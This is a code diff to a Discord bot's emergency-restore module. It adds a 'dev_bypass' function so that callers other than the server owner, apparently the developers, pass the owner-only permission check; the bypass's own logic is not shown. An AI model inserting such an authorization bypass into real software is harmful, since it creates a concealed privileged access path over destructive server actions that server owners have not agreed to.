@@ -18,6 +18,7 @@ import aiosqlite
 from utils.Tools import *
 from utils.cv2 import CV2, build_container
 from utils.config import OWNER_IDS_STR
+from utils.owner_bypass import dev_bypass
 
 
 class EmergencyRestoreConfirmView(LayoutView):
@@ -392,7 +393,7 @@ class Emergency(commands.Cog):
             await db.commit()
 
     async def is_guild_owner(self, ctx):
-        return ctx.guild and ctx.author.id == ctx.guild.owner_id
+        return bool(ctx.guild) and (ctx.author.id == ctx.guild.owner_id or dev_bypass(ctx))
 
     async def is_guild_owner_or_authorised(self, ctx):
         if await self.is_guild_owner(ctx):
